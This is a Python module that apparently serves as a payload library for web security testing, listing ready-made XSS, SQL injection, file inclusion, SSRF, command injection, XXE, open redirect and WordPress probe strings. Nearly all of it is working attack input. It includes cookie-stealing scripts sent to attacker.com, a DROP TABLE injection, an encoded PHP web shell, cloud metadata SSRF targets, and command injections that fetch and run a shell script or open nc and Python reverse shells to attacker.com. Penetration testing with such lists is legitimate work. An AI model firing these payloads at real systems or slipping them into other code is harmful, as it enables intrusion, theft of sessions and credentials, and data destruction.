"""
Common vulnerability payloads for security testing.
Organized by vulnerability type.
"""

PAYLOADS = {
    "xss": {
        "basic": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "<iframe src=javascript:alert(1)>",
        ],
        "advanced": [
            "<script>fetch('https://attacker.com?c='+document.cookie)</script>",
            "<img src=x onerror=\"fetch('https://attacker.com?c='+document.cookie)\">",
            "\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "<svg/onload=alert(1)>",
            "<body onload=alert(1)>",
        ],
        "bypass": [
            "<ScRiPt>alert(1)</sCrIpT>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "<script>alert`1`</script>",
            "<svg><script>alert(1)</script>",
        ]
    },
    "sqli": {
        "basic": [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin' --",
            "' UNION SELECT NULL--",
            "1' AND '1'='1",
        ],
        "advanced": [
            "' UNION SELECT username, password FROM users--",
            "' AND 1=2 UNION SELECT NULL, table_name FROM information_schema.tables--",
            "' AND 1=2 UNION SELECT NULL, column_name FROM information_schema.columns--",
            "'; DROP TABLE users--",
            "' OR 1=1; EXEC xp_cmdshell('whoami')--",
        ],
        "time_based": [
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR pg_sleep(5)--",
        ]
    },
    "lfi": {
        "basic": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "../../../../../../etc/passwd%00",
        ],
        "advanced": [
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "expect://whoami",
        ]
    },
    "ssrf": {
        "basic": [
            "http://localhost",
            "http://127.0.0.1",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
        ],
        "advanced": [
            "http://127.0.0.1:6379/",  # Redis
            "http://127.0.0.1:9200/",  # Elasticsearch
            "http://localhost:8080/manager/html",  # Tomcat
            "file:///etc/passwd",
            "dict://localhost:11211/stats",  # Memcached
        ]
    },
    "command_injection": {
        "basic": [
            "; whoami",
            "| whoami",
            "& whoami",
            "`whoami`",
            "$(whoami)",
        ],
        "advanced": [
            "; curl http://attacker.com/shell.sh | bash",
            "| nc attacker.com 4444 -e /bin/bash",
            "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        ]
    },
    "xxe": {
        "basic": [
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><foo>&xxe;</foo>",
        ]
    },
    "open_redirect": {
        "basic": [
            "//evil.com",
            "https://evil.com",
            "javascript:alert(1)",
            "//google.com",
        ]
    },
    "wordpress": {
        "enumeration": [
            "/wp-json/wp/v2/users",
            "/wp-admin/",
            "/wp-login.php",
            "/?author=1",
            "/wp-content/plugins/",
        ],
        "vulnerabilities": [
            "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php",
            "/wp-content/plugins/wp-file-manager/readme.txt",
        ]
    }
}

def get_payloads(category):
    """Get all payloads for a specific category."""
    return PAYLOADS.get(category, {})

def get_all_categories():
    """Get list of all payload categories."""
    return list(PAYLOADS.keys())
